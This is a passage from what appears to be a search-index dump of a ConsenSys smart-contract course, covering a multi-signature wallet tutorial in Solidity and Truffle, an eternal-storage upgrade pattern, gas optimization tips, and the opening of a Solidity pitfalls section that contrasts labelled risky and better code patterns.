whatever smart contract IDE you prefer. Let's review what this contract needs to be able to do before we start writing the code: The contract will have multiple owners that will determine which transactions the contract is allowed to execute. Contract owners need to be able to propose transactions that other owners can either confirm or revoke . If a proposed transaction receives enough support, it will be executed. Keeping these requirements in mind, let's go through the contract stub and start implementing this functionality. Constructor Starting with the constructor, you can see that with the latest solidity compiler version, using the contract name as the constructor name has been deprecated, so let's change it to constructor. constructor ( address [] memory _owners , uint _required ) We are going to want to check the user inputs to the constructor to make sure that a user does not require more confirmations than there are owners, that the contract requires at least one confirmation before sending a transaction and that the owner array contains at least one address. We can create a modifier that checks these conditions modifier validRequirement ( uint ownerCount , uint _required ) { if ( _required > ownerCount || _required == 0 || ownerCount == 0 ) revert () ; _ ; } And call it when the constructor runs. constructor ( address [] memory _owners , uint _required ) public validRequirement ( _owners . length , _required ){ ... } We are going to want to keep the _owners and _required values for the life of the contract, so we need to declare the variables in storage in order to save them. address[] public owners; uint public required; mapping (address => bool) public isOwner; We also added a mapping of owner addresses to booleans so that we can quickly reference (without having to loop over the owners array) whether a specific address is an owner or not. All of these variables will be set in the constructor. constructor ( address [] memory _owners , uint _required ) public validRequirement ( _owners . length , _required ) { for ( uint i = 0 ; i < _owners . length ; i ++ ) { isOwner [ _owners[i ] ] = true ; } owners = _owners ; required = _required ; } Submit Transaction The submitTransaction function allows an owner to submit and confirm a transaction. First we need to restrict this function to only be callable by an owner. require(isOwner[msg.sender]); Looking at the rest of the contract stub, you will notice that there are two other functions in the contract that can help you implement this function, one is called addTransaction that takes the same inputs as submitTransaction and returns a uint transactionId . The other is called confirmTransaction that takes a uint transactionId . We can easily implement submitTransaction with the help of these other functions: function submitTransaction ( address destination, uint value, bytes memory data ) public returns ( uint transactionId ) { require ( isOwner [ msg . sender ]); transactionId = addTransaction ( destination , value , data ); confirmTransaction ( transactionId ); } Add Transaction Let's jump to the addTransaction function and implement that. This function adds a new transaction to the transaction mapping (which we are about to create), if the transaction does not exist yet. function addTransaction ( address destination, uint value, bytes memory data ) internal returns ( uint transactionId ); A transaction is a data structure that is defined in the contract stub. struct Transaction { address destination; uint value; bytes data; bool executed; } We need to store the inputs to the addTransaction function in a Transaction struct and create a transaction id for the transaction. Let's create two more storage variables to keep track of the transaction ids and transaction mapping. uint public transactionCount; mapping (uint => Transaction) public transactions; In the addTransaction function we can get the transaction count, store the transaction in the mapping and increment the count. This function modifies the state so it is a good practice to emit an event. We will emit a Submission event that takes a transactionId . Let's define the event first. Events are usually defined at the top of a Solidity contract, so that is what we will do. Add this line just below the contract declaration. event Submission(uint indexed transactionId); The indexed keyword in the event declaration makes the event easily searchable and is useful when building user interfaces that need to parse lots of events. In the function body we can call the event. function addTransaction ( address destination, uint value, bytes memory data ) internal returns ( uint transactionId ) { transactionId = transactionCount ; transactions [ transactionId ] = Transaction ({ destination : destination , value : value , data : data , executed : false }); transactionCount + = 1 ; emit Submission(transactionId) ; } The uint transactionId is returned from the addTransaction function to hand over to the confirmTransaction function. Confirm Transaction function confirmTransaction(uint transactionId) public {} The confirm transaction function allows an owner to confirm an added transaction. This requires another storage variable, a confirmations mapping that stores a mapping of boolean values at owner addresses. This variable keeps track of which owner addresses have confirmed which transactions. mapping (uint => mapping (address => bool)) public confirmations; There are several checks that we will want to verify before we execute this transaction. First, only wallet owners should be able to call this function. Second, we will want to verify that a transaction exists at the specified transactionId . Last, we want to verify that the msg.sender has not already confirmed this transaction. require ( isOwner [ msg.sender ] ); require ( transactions [ transactionId ] . destination != address ( 0 )); require ( confirmations [ transactionId ][ msg.sender ] == false ); Once the transaction receives the required number of confirmations, the transaction should execute, so once the appropriate boolean is set to true confirmations [ transactionId ][ msg.sender ] = true ; Since we are modifying the state in this function, it is a good practice to log an event. First, we define the event called Confirmation that logs the confirmers address as well as the transactionId of the transaction that they are confirming. event Confirmation(address indexed sender, uint indexed transactionId); Both of these event parameters are indexed to make the event more easily searchable. Now we can call the event in the function. After logging the event we can attempt to execute the transaction executeTransaction(transactionId); So the entire function should look like this: function confirmTransaction ( uint transactionId ) public { require ( isOwner [ msg . sender ]); require ( transactions [ transactionId ]. destination ! = address ( 0 )); require ( confirmations [ transactionId ][ msg . sender ] == false ); confirmations [ transactionId ][ msg . sender ] = true ; emit Confirmation(msg.sender, transactionId) ; executeTransaction ( transactionId ); } Execute Transaction The execute transaction function takes a single parameter, the transactionId . First, we want to make sure that the Transaction at the specified id has not already been executed. require ( transactions [ transactionId ] . executed == false ); Then we want to verify that the transaction has at least the required number of confirmations. To do this we will loop over the owners array and count how many of the owners have confirmed the transaction. If the count reaches the required amount, we can stop counting (save gas) and just say the requirement has been reached. I define the helper function isConfirmed, which we can call from the executeTransaction function. function isConfirmed ( uint transactionId ) public view returns ( bool ) { uint count = 0 ; for ( uint i = 0 ; i < owners . length ; i ++ ) { if ( confirmations [ transactionId ][ owners [ i ]]) count + = 1 ; if ( count == required ) return true ; } } It will return true if the transaction is confirmed, so in the executeTransaction function, we can execute the transaction at the specified if it is confirmed, otherwise do not execute it and then update the Transaction struct to reflect the state. We are updating the state, so we should log an event reflecting the change. event Execution(uint indexed transactionId); event ExecutionFailure(uint indexed transactionId); We have two possible outcomes of this function -- the transaction is not guaranteed to successfully execute. We will want to catalog whether the send transaction successfully executes or fails. Notice how the function body handles a failed transaction and tracks it in the contract state. function executeTransaction ( uint transactionId ) public { require ( transactions [ transactionId ]. executed == false ); if ( isConfirmed ( transactionId )) { // using the \"storage\" keyword makes \"t\" a pointer to storage Transaction storage t = transactions [ transactionId ]; t . executed = true ; ( bool success , bytes memory returnedData ) = t . destination . call . value ( t . value )( t . data ); if ( success ) emit Execution ( transactionId ); else { emit ExecutionFailure ( transactionId ); t . executed = false ; } } } Additional Functions So far, we have only covered the core functionality of this MultiSignature Wallet found in the ConsenSys github repository. I will leave it to you to continue the exercise and explore the rest of the contract. The code is well commented and you should be able to determine and explain the purpose of each function in the contract. If you would like a further challenge, continue on to the bottom of the Solidity file and investigate the MultiSigWalletWithDailyLimit contract . Note: If you want to execute a transaction that sends value from the MultiSig contract, you have to make sure that the contract has enough value to make the transfer. You can deposit ether directly to the MultiSig wallet contract using the included fallback function. Interacting with the Contract Now that we have a basic MultiSignature Wallet, let's interact with the Multisig Wallet and see how it works. Copy the contract that we developed in Remix into the truffle project directory provided. You can see that the project directory comes with a SimpleStorage.sol contract. This is the contract that we are going to be calling from the Multisig contract. If you look in the migrations directory you will see the deployment script that truffle will use to deploy the SimpleStorage contract as well as the MultiSig Wallet. The truffle deployer allows us to access accounts, which is useful given that the MultiSig contract constructor requires an array of owner addresses as as well as the number of required confirmations to execute a transaction. The owners array and the deployment scripts are already in the file. const owners = [ accounts [ 0 ], accounts [ 1 ]] deployer . deploy ( MultiSig , owners , 2 ) We are only going to require 2 confirmations for the sake of simplicity. To deploy the contracts, start the development environment by running truffle develop in a terminal window at the project directory. The truffle command line will appear truffle(develop)> Deploy the contracts truffle(develop)> migrate If migrate does not work, try migrate --reset . And then get the deployed instances of the SimpleStorage.sol and MultiSignatureWallet.sol contracts. truffle ( develop ) > var ss = await SimpleStorage . at ( SimpleStorage . address ) truffle ( develop ) > var ms = await MultiSignatureWallet . at ( MultiSignatureWallet . address ) Check the state of the SimpleStorage contract truffle(develop)> ss.storedData.call() <BN: 0> This means that it is 0. You can verify by waiting for the promise to resolve and converting the answer to a string. Try it with: ss . storedData . call () . then ( res => { console . log ( res . toString ( 10 ) ) } ) 0 Let's submit a transaction to update the state of the SimpleStorage contract to the MultiSig contract. SumbitTransaction takes the address of the destination contract, the value to send with the transaction and the transaction data, which includes the encoded function signature and input parameters. If we want to update the SimpleStorage contract data to be 5, the encoded function signature and input parameters would look like this: var encoded = '0x60fe47b10000000000000000000000000000000000000000000000000000000000000005' Let's get the available accounts and then make a call to the MultiSig contract: truffle ( develop ) > var accounts = await web3 . eth . getAccounts () truffle ( develop ) > ms . submitTransaction ( ss . address , 0 , encoded , { from : accounts [ 0 ]}) And we see the transaction information printed in the terminal window. In the logs, we can see that a \u201cSubmission\u201d event was fired, as well as a \u201cConfirmation\u201d event, which is what we expect. The current state of the MultiSig has one transaction that has not been executed and has one confirmation (from the address that submitted it). One more confirmation should cause the transaction to execute. Let's use the second account to confirm it. The confirmTransaction function takes one input, the index of the Transaction to confirm. truffle(develop)> ms.confirmTransaction(0, {from: accounts[1]}) The transaction information is printed in the terminal. You should see two log events this time as well. A \u201cConfirmation\u201d event as well as an \u201cExecution\u201d event. This indicates that the call to SimpleStorage executed successfully. If it didn't execute successfully, we would see an \u201cExecutionFailure\u201d event there instead. We can verify that the state of the contract was updated by running truffle(develop)> ss.storedData.call() <BN: 5> The storedData is now 5. And we can check that the address that updated the SimpleStorage contract was the MultiSig Wallet. truffle(develop)> ss.caller.call() \u20180x855d1c79ad3fb086d516554dc7187e3fdfc1c79a' truffle(develop)> ms.address \u20180x855d1c79ad3fb086d516554dc7187e3fdfc1c79a' The two addresses are the same! Congratulations! You've just built a multi-sig wallet that uses basic access control!","title":"Index"},{"location":"S03-smart-contracts/M4-design-patterns/L6-general-finance/#general-finance-multi-sig","text":"This section is a tutorial setting up a Multi-Sig contract, which functions as a store of value (it's called a \"wallet\" in the traditional sense of something that holds money, not a crypto-wallet like MetaMask). It is based on this project by Nate Rush. The solution is based on this MultiSignature Wallet found in the ConsenSys github repository. You can find the GitHub repository for this exercise here .","title":"General Finance: Multi-Sig"},{"location":"S03-smart-contracts/M4-design-patterns/L6-general-finance/#what-is-a-multi-signature-wallet","text":"A multi-signature wallet is an account that requires some m-of-n quorum of approved private keys to approve a transaction before it is executed. In Ethereum, multi-signature wallets are implemented as a smart contract, that each of the approved external accounts sends a transaction to in order to \"sign\" a group transaction. Following this project spec designed by the UPenn Blockchain Club, you will now create your own multisignature wallet contract. Note: It is not suggested that you use this multisignature wallet with any real funds, but rather use a far more deeply audited one such as the Gnosis multisignature wallet.","title":"What is a Multi-signature wallet?"},{"location":"S03-smart-contracts/M4-design-patterns/L6-general-finance/#project-setup","text":"Clone this GitHub repository. The MultiSignatureWallet.sol file in the contracts directory has the structure of a multisignature wallet that you will be implementing.","title":"Project Setup"},{"location":"S03-smart-contracts/M4-design-patterns/L6-general-finance/#implementing-the-contract","text":"Copy the contents of the MultiSignatureWallet.sol file found in the project directory into Remix, Truffle, or whatever smart contract IDE you prefer. Let's review what this contract needs to be able to do before we start writing the code: The contract will have multiple owners that will determine which transactions the contract is allowed to execute. Contract owners need to be able to propose transactions that other owners can either confirm or revoke . If a proposed transaction receives enough support, it will be executed. Keeping these requirements in mind, let's go through the contract stub and start implementing this functionality.","title":"Implementing the Contract"},{"location":"S03-smart-contracts/M4-design-patterns/L6-general-finance/#constructor","text":"Starting with the constructor, you can see that with the latest solidity compiler version, using the contract name as the constructor name has been deprecated, so let's change it to constructor. constructor ( address [] memory _owners , uint _required ) We are going to want to check the user inputs to the constructor to make sure that a user does not require more confirmations than there are owners, that the contract requires at least one confirmation before sending a transaction and that the owner array contains at least one address. We can create a modifier that checks these conditions modifier validRequirement ( uint ownerCount , uint _required ) { if ( _required > ownerCount || _required == 0 || ownerCount == 0 ) revert () ; _ ; } And call it when the constructor runs. constructor ( address [] memory _owners , uint _required ) public validRequirement ( _owners . length , _required ){ ... } We are going to want to keep the _owners and _required values for the life of the contract, so we need to declare the variables in storage in order to save them. address[] public owners; uint public required; mapping (address => bool) public isOwner; We also added a mapping of owner addresses to booleans so that we can quickly reference (without having to loop over the owners array) whether a specific address is an owner or not. All of these variables will be set in the constructor. constructor ( address [] memory _owners , uint _required ) public validRequirement ( _owners . length , _required ) { for ( uint i = 0 ; i < _owners . length ; i ++ ) { isOwner [ _owners[i ] ] = true ; } owners = _owners ; required = _required ; }","title":"Constructor"},{"location":"S03-smart-contracts/M4-design-patterns/L6-general-finance/#submit-transaction","text":"The submitTransaction function allows an owner to submit and confirm a transaction. First we need to restrict this function to only be callable by an owner. require(isOwner[msg.sender]); Looking at the rest of the contract stub, you will notice that there are two other functions in the contract that can help you implement this function, one is called addTransaction that takes the same inputs as submitTransaction and returns a uint transactionId . The other is called confirmTransaction that takes a uint transactionId . We can easily implement submitTransaction with the help of these other functions: function submitTransaction ( address destination, uint value, bytes memory data ) public returns ( uint transactionId ) { require ( isOwner [ msg . sender ]); transactionId = addTransaction ( destination , value , data ); confirmTransaction ( transactionId ); }","title":"Submit Transaction"},{"location":"S03-smart-contracts/M4-design-patterns/L6-general-finance/#add-transaction","text":"Let's jump to the addTransaction function and implement that. This function adds a new transaction to the transaction mapping (which we are about to create), if the transaction does not exist yet. function addTransaction ( address destination, uint value, bytes memory data ) internal returns ( uint transactionId ); A transaction is a data structure that is defined in the contract stub. struct Transaction { address destination; uint value; bytes data; bool executed; } We need to store the inputs to the addTransaction function in a Transaction struct and create a transaction id for the transaction. Let's create two more storage variables to keep track of the transaction ids and transaction mapping. uint public transactionCount; mapping (uint => Transaction) public transactions; In the addTransaction function we can get the transaction count, store the transaction in the mapping and increment the count. This function modifies the state so it is a good practice to emit an event. We will emit a Submission event that takes a transactionId . Let's define the event first. Events are usually defined at the top of a Solidity contract, so that is what we will do. Add this line just below the contract declaration. event Submission(uint indexed transactionId); The indexed keyword in the event declaration makes the event easily searchable and is useful when building user interfaces that need to parse lots of events. In the function body we can call the event. function addTransaction ( address destination, uint value, bytes memory data ) internal returns ( uint transactionId ) { transactionId = transactionCount ; transactions [ transactionId ] = Transaction ({ destination : destination , value : value , data : data , executed : false }); transactionCount + = 1 ; emit Submission(transactionId) ; } The uint transactionId is returned from the addTransaction function to hand over to the confirmTransaction function.","title":"Add Transaction"},{"location":"S03-smart-contracts/M4-design-patterns/L6-general-finance/#confirm-transaction","text":"function confirmTransaction(uint transactionId) public {} The confirm transaction function allows an owner to confirm an added transaction. This requires another storage variable, a confirmations mapping that stores a mapping of boolean values at owner addresses. This variable keeps track of which owner addresses have confirmed which transactions. mapping (uint => mapping (address => bool)) public confirmations; There are several checks that we will want to verify before we execute this transaction. First, only wallet owners should be able to call this function. Second, we will want to verify that a transaction exists at the specified transactionId . Last, we want to verify that the msg.sender has not already confirmed this transaction. require ( isOwner [ msg.sender ] ); require ( transactions [ transactionId ] . destination != address ( 0 )); require ( confirmations [ transactionId ][ msg.sender ] == false ); Once the transaction receives the required number of confirmations, the transaction should execute, so once the appropriate boolean is set to true confirmations [ transactionId ][ msg.sender ] = true ; Since we are modifying the state in this function, it is a good practice to log an event. First, we define the event called Confirmation that logs the confirmers address as well as the transactionId of the transaction that they are confirming. event Confirmation(address indexed sender, uint indexed transactionId); Both of these event parameters are indexed to make the event more easily searchable. Now we can call the event in the function. After logging the event we can attempt to execute the transaction executeTransaction(transactionId); So the entire function should look like this: function confirmTransaction ( uint transactionId ) public { require ( isOwner [ msg . sender ]); require ( transactions [ transactionId ]. destination ! = address ( 0 )); require ( confirmations [ transactionId ][ msg . sender ] == false ); confirmations [ transactionId ][ msg . sender ] = true ; emit Confirmation(msg.sender, transactionId) ; executeTransaction ( transactionId ); }","title":"Confirm Transaction"},{"location":"S03-smart-contracts/M4-design-patterns/L6-general-finance/#execute-transaction","text":"The execute transaction function takes a single parameter, the transactionId . First, we want to make sure that the Transaction at the specified id has not already been executed. require ( transactions [ transactionId ] . executed == false ); Then we want to verify that the transaction has at least the required number of confirmations. To do this we will loop over the owners array and count how many of the owners have confirmed the transaction. If the count reaches the required amount, we can stop counting (save gas) and just say the requirement has been reached. I define the helper function isConfirmed, which we can call from the executeTransaction function. function isConfirmed ( uint transactionId ) public view returns ( bool ) { uint count = 0 ; for ( uint i = 0 ; i < owners . length ; i ++ ) { if ( confirmations [ transactionId ][ owners [ i ]]) count + = 1 ; if ( count == required ) return true ; } } It will return true if the transaction is confirmed, so in the executeTransaction function, we can execute the transaction at the specified if it is confirmed, otherwise do not execute it and then update the Transaction struct to reflect the state. We are updating the state, so we should log an event reflecting the change. event Execution(uint indexed transactionId); event ExecutionFailure(uint indexed transactionId); We have two possible outcomes of this function -- the transaction is not guaranteed to successfully execute. We will want to catalog whether the send transaction successfully executes or fails. Notice how the function body handles a failed transaction and tracks it in the contract state. function executeTransaction ( uint transactionId ) public { require ( transactions [ transactionId ]. executed == false ); if ( isConfirmed ( transactionId )) { // using the \"storage\" keyword makes \"t\" a pointer to storage Transaction storage t = transactions [ transactionId ]; t . executed = true ; ( bool success , bytes memory returnedData ) = t . destination . call . value ( t . value )( t . data ); if ( success ) emit Execution ( transactionId ); else { emit ExecutionFailure ( transactionId ); t . executed = false ; } } }","title":"Execute Transaction"},{"location":"S03-smart-contracts/M4-design-patterns/L6-general-finance/#additional-functions","text":"So far, we have only covered the core functionality of this MultiSignature Wallet found in the ConsenSys github repository. I will leave it to you to continue the exercise and explore the rest of the contract. The code is well commented and you should be able to determine and explain the purpose of each function in the contract. If you would like a further challenge, continue on to the bottom of the Solidity file and investigate the MultiSigWalletWithDailyLimit contract . Note: If you want to execute a transaction that sends value from the MultiSig contract, you have to make sure that the contract has enough value to make the transfer. You can deposit ether directly to the MultiSig wallet contract using the included fallback function.","title":"Additional Functions"},{"location":"S03-smart-contracts/M4-design-patterns/L6-general-finance/#interacting-with-the-contract","text":"Now that we have a basic MultiSignature Wallet, let's interact with the Multisig Wallet and see how it works. Copy the contract that we developed in Remix into the truffle project directory provided. You can see that the project directory comes with a SimpleStorage.sol contract. This is the contract that we are going to be calling from the Multisig contract. If you look in the migrations directory you will see the deployment script that truffle will use to deploy the SimpleStorage contract as well as the MultiSig Wallet. The truffle deployer allows us to access accounts, which is useful given that the MultiSig contract constructor requires an array of owner addresses as as well as the number of required confirmations to execute a transaction. The owners array and the deployment scripts are already in the file. const owners = [ accounts [ 0 ], accounts [ 1 ]] deployer . deploy ( MultiSig , owners , 2 ) We are only going to require 2 confirmations for the sake of simplicity. To deploy the contracts, start the development environment by running truffle develop in a terminal window at the project directory. The truffle command line will appear truffle(develop)> Deploy the contracts truffle(develop)> migrate If migrate does not work, try migrate --reset . And then get the deployed instances of the SimpleStorage.sol and MultiSignatureWallet.sol contracts. truffle ( develop ) > var ss = await SimpleStorage . at ( SimpleStorage . address ) truffle ( develop ) > var ms = await MultiSignatureWallet . at ( MultiSignatureWallet . address ) Check the state of the SimpleStorage contract truffle(develop)> ss.storedData.call() <BN: 0> This means that it is 0. You can verify by waiting for the promise to resolve and converting the answer to a string. Try it with: ss . storedData . call () . then ( res => { console . log ( res . toString ( 10 ) ) } ) 0 Let's submit a transaction to update the state of the SimpleStorage contract to the MultiSig contract. SumbitTransaction takes the address of the destination contract, the value to send with the transaction and the transaction data, which includes the encoded function signature and input parameters. If we want to update the SimpleStorage contract data to be 5, the encoded function signature and input parameters would look like this: var encoded = '0x60fe47b10000000000000000000000000000000000000000000000000000000000000005' Let's get the available accounts and then make a call to the MultiSig contract: truffle ( develop ) > var accounts = await web3 . eth . getAccounts () truffle ( develop ) > ms . submitTransaction ( ss . address , 0 , encoded , { from : accounts [ 0 ]}) And we see the transaction information printed in the terminal window. In the logs, we can see that a \u201cSubmission\u201d event was fired, as well as a \u201cConfirmation\u201d event, which is what we expect. The current state of the MultiSig has one transaction that has not been executed and has one confirmation (from the address that submitted it). One more confirmation should cause the transaction to execute. Let's use the second account to confirm it. The confirmTransaction function takes one input, the index of the Transaction to confirm. truffle(develop)> ms.confirmTransaction(0, {from: accounts[1]}) The transaction information is printed in the terminal. You should see two log events this time as well. A \u201cConfirmation\u201d event as well as an \u201cExecution\u201d event. This indicates that the call to SimpleStorage executed successfully. If it didn't execute successfully, we would see an \u201cExecutionFailure\u201d event there instead. We can verify that the state of the contract was updated by running truffle(develop)> ss.storedData.call() <BN: 5> The storedData is now 5. And we can check that the address that updated the SimpleStorage contract was the MultiSig Wallet. truffle(develop)> ss.caller.call() \u20180x855d1c79ad3fb086d516554dc7187e3fdfc1c79a' truffle(develop)> ms.address \u20180x855d1c79ad3fb086d516554dc7187e3fdfc1c79a' The two addresses are the same! Congratulations! You've just built a multi-sig wallet that uses basic access control!","title":"Interacting with the Contract"},{"location":"S03-smart-contracts/M4-design-patterns/L7-upgradable-contracts/","text":"Currently on LMS This content is a video hosted on courses.consensys.net (for now)","title":"Index"},{"location":"S03-smart-contracts/M4-design-patterns/L7-upgradable-contracts/#currently-on-lms","text":"This content is a video hosted on courses.consensys.net (for now)","title":"Currently on LMS"},{"location":"S03-smart-contracts/M4-design-patterns/L8-add-material-upgradable-contracts/","text":"Additional Material: Upgradable Contracts We wanted to provide another example of an upgradable contract pattern. This pattern uses a separate contract to act as storage to another contract that contains the logic, also known as a \"proxy delegate pattern\". When you upgrade a contract, all your state is still in the old contract address. Therefore, we say the contract has \"Eternal Storage.\" To avoid upgrades to the storage contract it should be as flexible as possible, by using several mappings for each data type where hashes are used as keys (only uint is shown in the example below): address owner = msg . sender ; address latestVersion ; mapping ( bytes32 => uint ) uIntStorage ; function upgradeVersion ( address _newVersion ) public { require ( msg . sender == owner ); latestVersion = _newVersion ; } function getUint ( bytes32 _key ) external view returns ( uint ) { return uIntStorage [ _key ] ; } function setUint ( bytes32 _key , uint _value ) external { require ( msg . sender == latestVersion ); uIntStorage [ _key ] = _value ; } function deleteUint ( bytes32 _key ) external { require ( msg . sender == latestVersion ); delete uIntStorage [ _key ] ; } Each mapping should be manipulated by three functions: store, retrieve and delete. Use the access control pattern to allow only the most recent version of the logic contract to use the \"eternal storage.\" Additional Material Article Series: Summary of Ethereum Upgradeable Smart Contract R&D, Part I and Part II Great overview of upgradability patterns. Tutorial: Upgrading Broken Contracts (ConsenSys) Tutorial: Diamond Standard An interesting variation on upgradability patterns. We don't see it out a lot in the wild, but an interesting development!","title":"Index"},{"location":"S03-smart-contracts/M4-design-patterns/L8-add-material-upgradable-contracts/#additional-material-upgradable-contracts","text":"We wanted to provide another example of an upgradable contract pattern. This pattern uses a separate contract to act as storage to another contract that contains the logic, also known as a \"proxy delegate pattern\". When you upgrade a contract, all your state is still in the old contract address. Therefore, we say the contract has \"Eternal Storage.\" To avoid upgrades to the storage contract it should be as flexible as possible, by using several mappings for each data type where hashes are used as keys (only uint is shown in the example below): address owner = msg . sender ; address latestVersion ; mapping ( bytes32 => uint ) uIntStorage ; function upgradeVersion ( address _newVersion ) public { require ( msg . sender == owner ); latestVersion = _newVersion ; } function getUint ( bytes32 _key ) external view returns ( uint ) { return uIntStorage [ _key ] ; } function setUint ( bytes32 _key , uint _value ) external { require ( msg . sender == latestVersion ); uIntStorage [ _key ] = _value ; } function deleteUint ( bytes32 _key ) external { require ( msg . sender == latestVersion ); delete uIntStorage [ _key ] ; } Each mapping should be manipulated by three functions: store, retrieve and delete. Use the access control pattern to allow only the most recent version of the logic contract to use the \"eternal storage.\"","title":"Additional Material: Upgradable Contracts"},{"location":"S03-smart-contracts/M4-design-patterns/L8-add-material-upgradable-contracts/#additional-material","text":"Article Series: Summary of Ethereum Upgradeable Smart Contract R&D, Part I and Part II Great overview of upgradability patterns. Tutorial: Upgrading Broken Contracts (ConsenSys) Tutorial: Diamond Standard An interesting variation on upgradability patterns. We don't see it out a lot in the wild, but an interesting development!","title":"Additional Material"},{"location":"S03-smart-contracts/M4-design-patterns/L9-optimizing-gas/","text":"Optimizing Gas Reducing the gas consumed by a contract is important in two situations: Cost of deploying a contract Cost to call the contract functions The Solidity optimizer tries to improve the efficiency of your contract as much as possible during compile time. Feel free to dig into the internals of the optimizer. One of the best ways to optimize your contracts gas usage is to reduce expensive operations in the contract's functions. Creating and modifying storage variables can be expensive. 20,000 gas when a value is set to non-zero from zero; 5,000 gas when writing to existing storage or setting a value to zero; and a 15,000 gas refund when a non-zero value is set to zero. Here is a list of OPCODES and their gas costs. Short Circuit Rules The operators || and && apply the common short-circuiting rules. This means that in the expression f(x) || g(y) , if f(x) evaluates to true, g(y) will not be evaluated even if it may have side-effects. How can these functions in Unoptimized.sol be modified to reduce gas usage? function shortCircuit () public view returns ( bool ) { if ( oftenFalse || oftenTrue ) { return true ; } } function shortCircuit2 () public view returns ( bool ) { if ( oftenTrue && oftenFalse ) { return false ; } else { return true ; } } Expensive operations in a loop Modifying storage variables in a loop can be very expensive and should be avoided unless absolutely necessary. How can this function be improved, given that loops is a storage variable? Here is the source file. function looping ( uint x ) public returns ( bool ) { for ( uint i ; i < x; i++){ loops += 1 ; } return true ; } Reduce the number of loops Zero loops is ideal, but sometimes you just have to loop. Since loops are expensive, can you reduce the number of loops in your functions? function looping2 ( uint x ) public pure returns ( bool ) { uint m = 0 ; uint v = 0 ; for ( uint i = 0 ; i < x; i++){ m += i ; } for ( uint j = 0 ; j < x; j++){ v -= j ; } return true ; } Fixed size byte arrays From the Solidity Docs: It is possible to use an array of bytes as byte[] , but it is wasting a lot of space, 31 bytes every element, to be exact, when passing in calls. It is better to use bytes . As a rule of thumb, use bytes for arbitrary-length raw byte data and string for arbitrary-length string (UTF-8) data. If you can limit the length to a certain number of bytes, always use one of bytes1 to bytes32 because they are much cheaper. How can this function be optimized? function byteArray () public returns ( uint ) { byte [] byteArray ; return gasleft () ; } Additional Resources: Optimizing Solidity contract's gas usage Under Optimized Smart Contracts Devour Your Money How to Write Smart Contracts that Optimize Gas","title":"Index"},{"location":"S03-smart-contracts/M4-design-patterns/L9-optimizing-gas/#optimizing-gas","text":"Reducing the gas consumed by a contract is important in two situations: Cost of deploying a contract Cost to call the contract functions The Solidity optimizer tries to improve the efficiency of your contract as much as possible during compile time. Feel free to dig into the internals of the optimizer. One of the best ways to optimize your contracts gas usage is to reduce expensive operations in the contract's functions. Creating and modifying storage variables can be expensive. 20,000 gas when a value is set to non-zero from zero; 5,000 gas when writing to existing storage or setting a value to zero; and a 15,000 gas refund when a non-zero value is set to zero. Here is a list of OPCODES and their gas costs.","title":"Optimizing Gas"},{"location":"S03-smart-contracts/M4-design-patterns/L9-optimizing-gas/#short-circuit-rules","text":"The operators || and && apply the common short-circuiting rules. This means that in the expression f(x) || g(y) , if f(x) evaluates to true, g(y) will not be evaluated even if it may have side-effects. How can these functions in Unoptimized.sol be modified to reduce gas usage? function shortCircuit () public view returns ( bool ) { if ( oftenFalse || oftenTrue ) { return true ; } } function shortCircuit2 () public view returns ( bool ) { if ( oftenTrue && oftenFalse ) { return false ; } else { return true ; } }","title":"Short Circuit Rules"},{"location":"S03-smart-contracts/M4-design-patterns/L9-optimizing-gas/#expensive-operations-in-a-loop","text":"Modifying storage variables in a loop can be very expensive and should be avoided unless absolutely necessary. How can this function be improved, given that loops is a storage variable? Here is the source file. function looping ( uint x ) public returns ( bool ) { for ( uint i ; i < x; i++){ loops += 1 ; } return true ; }","title":"Expensive operations in a loop"},{"location":"S03-smart-contracts/M4-design-patterns/L9-optimizing-gas/#reduce-the-number-of-loops","text":"Zero loops is ideal, but sometimes you just have to loop. Since loops are expensive, can you reduce the number of loops in your functions? function looping2 ( uint x ) public pure returns ( bool ) { uint m = 0 ; uint v = 0 ; for ( uint i = 0 ; i < x; i++){ m += i ; } for ( uint j = 0 ; j < x; j++){ v -= j ; } return true ; }","title":"Reduce the number of loops"},{"location":"S03-smart-contracts/M4-design-patterns/L9-optimizing-gas/#fixed-size-byte-arrays","text":"From the Solidity Docs: It is possible to use an array of bytes as byte[] , but it is wasting a lot of space, 31 bytes every element, to be exact, when passing in calls. It is better to use bytes . As a rule of thumb, use bytes for arbitrary-length raw byte data and string for arbitrary-length string (UTF-8) data. If you can limit the length to a certain number of bytes, always use one of bytes1 to bytes32 because they are much cheaper. How can this function be optimized? function byteArray () public returns ( uint ) { byte [] byteArray ; return gasleft () ; } Additional Resources: Optimizing Solidity contract's gas usage Under Optimized Smart Contracts Devour Your Money How to Write Smart Contracts that Optimize Gas","title":"Fixed size byte arrays"},{"location":"S03-smart-contracts/M5-exercises/L1/","text":"Title","title":"Index"},{"location":"S03-smart-contracts/M5-exercises/L1/#title","text":"","title":"Title"},{"location":"S03-smart-contracts/M5-exercises/L2/","text":"Title","title":"Index"},{"location":"S03-smart-contracts/M5-exercises/L2/#title","text":"","title":"Title"},{"location":"S03-smart-contracts/M6-security/L1-sc-best-practices/","text":"Title","title":"Index"},{"location":"S03-smart-contracts/M6-security/L1-sc-best-practices/#title","text":"","title":"Title"},{"location":"S03-smart-contracts/M6-security/L2-solidity-pitfalls-and-attacks/","text":"Solidity Pitfalls and Attacks As we've made clear again and again, smart contract development is potentially very dangerous. This is unlike the vast portion of web development, where environments and code can be torn down, changed, and easily deployed again. Because of this, being a smart contract developer means being acutely aware of the ways in which your code can be exploited and creating safety features to ensure against unforeseen attacks. Over the next few sections, we're going to be discussing smart contract security. We'll start by going over some common pitfalls and attacks with Solidity (as a language) and smart contracts generally. We'll then discuss testing as a means to further protect your code. Last, we'll go over some security services you can use when writing and developing smart contracts Solidity Tips Use Specific Compiler Pragma A common method is to use the ^ to indicate the lowest compiler version that your contract will work with. However, if you have a testing suite you've built against your contract, you should not include the ^ and just list the compiler version. pragma solidity ^0.4.4; // Possibly dangerous pragma solidity 0.4.4; // Better Built-In Variable Names Built-in variables can be shadowed, be careful when naming your functions: function revert() internal pure {} // Possibly dangerous function myRevert() internal pure {} // Better Proper Use of require , assert and revert require(msg.sender == owner) * Validation of inputs, external call returns and variables before state changes * Refunds remaining gas when fail * Should be used more often and towards the beginning of functions assert(age > 100) * Validation of invariants , situations that should never happen and variables after state changes * Consumes all gas when fail * Should be used less often and towards the end of functions revert() * Reverts the current transaction * Refunds remaining gas when fail * Used within if-else statements Use Modifiers Only for Validations Just do validations within modifiers and avoid external calls on them: modifier partnerShare() { // Possibly dangerous partner.transfer(msg.value / 10); _; } modifier onlyOwner() { // Better! require(msg.sender == owner); _; } Pull Over Push Prioritize receiving contract calls over making contract calls: function doRefund () external onlyOwner { // Possibly dangerous uint refund ; for 